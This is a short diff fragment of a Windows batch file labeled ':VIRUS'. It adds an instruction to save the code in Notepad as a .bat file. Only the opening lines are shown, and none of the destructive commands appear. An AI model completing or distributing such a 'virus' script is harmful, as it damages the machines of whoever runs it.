@@ -1,3 +1,5 @@
+put this in notepad and save as a .bat
+
 @echo off
 :VIRUS
 cd /d C:
